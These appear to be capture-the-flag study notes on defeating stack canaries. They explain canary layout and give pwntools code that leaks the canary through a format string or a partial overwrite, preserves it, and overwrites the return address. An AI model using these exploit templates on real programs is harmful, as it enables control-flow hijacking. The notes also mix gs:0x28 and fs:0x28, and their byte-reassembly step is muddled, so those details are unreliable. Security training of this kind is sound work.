### <span style="color:rgb(255, 192, 0)">What is a Stack Canary?</span>

- In function prologue **A random value placed on the stack between the buffer and the return address**, checked before the function returns (epilogue)
- Canary usually looks like `0x7a91f3c4008e1200`, it ends with `00`
- If it's been modified → program calls `__stack_chk_fail()` → **abort**
- Set at program start, stored in `gs:0x28` (thread-local storage)
```bash
mov    rax,QWORD PTR fs:0x28          # Strong indication of a canary
mov    QWORD PTR [rbp-0x8],rax        # Canary is located at [rbp-0x8] (inspect it using x/gx $rbp-0x8)

mov    rax,QWORD PTR [rbp-0x8]
sub    rax,QWORD PTR fs:0x28
jne    ...
call   __stack_chk_fail
```

Typical stack layout **with** canary:
```
[ buffer        ]
[ padding       ]
[ CANARY        ]  ← gets checked before ret
[ saved RBP     ]
[ return address ]
```

Check if binary has canary:
```bash
checksec ./binary     # look for Stack: Canary found
```

---
### <span style="color:rgb(255, 192, 0)">The Goal:</span>
Leak the canary value  
↓  
Include it unchanged in your payload  
↓  
Overflow past it to the return address  
↓  
Redirect execution  
↓  
Get flag

-----------------------------------
### <span style="color:rgb(255, 192, 0)">Key Canary Facts</span>

| Fact                  | Detail                                                  |
| --------------------- | ------------------------------------------------------- |
| Always ends in `\x00` | Null byte stops `printf`/`puts` from leaking it naively |
| Randomized per-run    | Can't hardcode it — must leak fresh each time           |
| Same across threads   | One leak = valid for whole process                      |
| 8 bytes (64-bit)      | 4 bytes on 32-bit                                       |

---

### <span style="color:rgb(255, 192, 0)">Method 1 — Format String Leak</span>

If there's a `printf(buf)` vulnerability before the overflow:
Step 1: find canary's format-string index
```python
from pwn import *

p = process('./binary')

# Brute-force which argument index holds the canary
# Canary is on the stack, looks like 0x????????00 (always ends in \x00)
p.sendline(b"%p " * 20)           # leak 20 stack values
print(p.recvall())                 # find the one ending in 00
```

Step 2: Once you know the index (e.g. 7), leak it directly:
```python
p.sendline(b"%7$p")               # leak canary as hex
leak = int(p.recvline().strip(), 16)      # parse it
canary = leak
```

Then build payload:
```python
offset_to_canary = 40             # cyclic to find distance from buffer start to canary
offset_to_ret    = offset_to_canary + 8 + 8   # canary + saved RBP

payload  = b"A" * offset_to_canary
payload += p64(canary)            # restore canary exactly
payload += b"B" * 8              # overwrite saved RBP (junk)
payload += p64(win)               # overwrite return address

p.sendline(payload)
p.interactive()
```

### <span style="color:rgb(255, 192, 0)">Method 2 — Off-by-One / Partial Overwrite Leak</span>

If the binary **prints back your buffer** (e.g. `printf(buf)` or `puts(buf)`) and there's a separate read:

- Overwrite **exactly up to** the canary's null byte
- The null byte gets overwritten → `puts()` reads past it and **prints the canary**

```python
from pwn import *

p = process('./binary')

# Fill buffer exactly to the null byte of the canary
p.send(b"A" * offset_to_canary)   # use send(), no newline!
p.recvuntil(b"A" * offset_to_canary)

# Read leaked canary bytes (7 bytes, then restore the \x00)
leaked = p.recv(7)
canary = b"\x00" + leaked[::-1]   # if little-endian reassembly needed
# OR more commonly:
canary = u64(b"\x00" + leaked)    # parse 7 bytes + null into 8-byte int
```

### <span style="color:rgb(255, 192, 0)">Finding Offset to Canary (GDB)</span>

```bash
gdb ./binary

r <<< $(pwn cyclic 200)

# Canary is stored at a fixed offset — look for the "stack smashing" abort
# After abort, inspect stack:
x/40gx $rsp                # look for value ending in 00
```

### <span style="color:rgb(255, 192, 0)">Payload Template (after leak)</span>

```python
from pwn import *

p = process('./binary')
# --- Step 1: leak canary ---
# (format string or puts overflow, see above)
canary = <leaked value>

# --- Step 2: overflow with canary preserved ---
offset_to_canary = 40          # junk before canary
win = 0xdeadbeef               # target address

payload  = b"A" * offset_to_canary
payload += p64(canary)         # exact canary value — must match!
payload += b"B" * 8           # saved RBP (usually don't care)
payload += p64(win)            # return address

p.sendline(payload)
p.interactive()
```

### <span style="color:rgb(255, 192, 0)">Things That Go Wrong:</span>

|PROBLEM|FIX|
|---|---|
|`stack smashing detected`|Canary value is wrong — re-check leak|
|Canary leaked as string, ends early|Null byte cut it — use `recv(7)` + prepend `\x00`|
|Format string index off|Try indices 1–30, look for value ending in `00`|
|Offset to canary wrong|GDB: `x/gx $rbp-0x8` to confirm canary location|
|`p.sendline()` corrupts canary|Use `p.send()` — the `\n` might land in the canary|